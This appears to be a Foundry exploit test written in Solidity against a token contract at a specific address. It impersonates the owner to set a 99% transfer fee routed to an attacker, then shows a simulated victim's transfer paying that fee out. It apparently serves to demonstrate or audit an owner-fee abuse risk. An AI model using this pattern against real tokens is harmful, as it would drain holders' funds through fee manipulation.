// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function owner() external view returns (address);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool);
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function txFee() external view returns (uint256);
    function burnFee() external view returns (uint256);
    function FeeAddress() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);
    ICoinToken target;
    address owner;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICoinToken(TARGET);
        vm.label(TARGET, "CoinToken Victim");
        vm.label(attacker, "Attacker");

        // Get the current owner to impersonate
        owner = target.owner();
        vm.label(owner, "Contract Owner");

        // Record initial attacker balance
        initialBalance = target.balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        // Step 1: Impersonate owner and set excessive fees
        vm.startPrank(owner);
        target.updateFee(99, 0, attacker);  // 99% txFee, fees go to attacker
        vm.stopPrank();

        // Step 2: Create a victim with tokens
        address victim = address(0x0000000000000000000000000000000000000001);
        vm.label(victim, "Victim User");
        deal(TARGET, victim, 10000 * 1e18);  // Give victim 10,000 tokens

        // Step 3: Victim transfers tokens (triggering excessive fees)
        address recipient = address(0x0000000000000000000000000000000000000002);
        vm.label(recipient, "Recipient");
        vm.startPrank(victim);
        target.transfer(recipient, 1000 * 1e18);  // Transfer 1,000 tokens
        vm.stopPrank();

        // Step 4: Verify attacker received excessive fees
        uint256 finalBalance = target.balanceOf(attacker);
        uint256 profit = finalBalance - initialBalance;

        // Attacker should receive ~99% of 1000 tokens = ~990 tokens as fees
        assertGt(profit, 900 * 1e18, "Attacker did not receive excessive fees");
        uint256 erc20FinalBalance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        assertGt(erc20FinalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
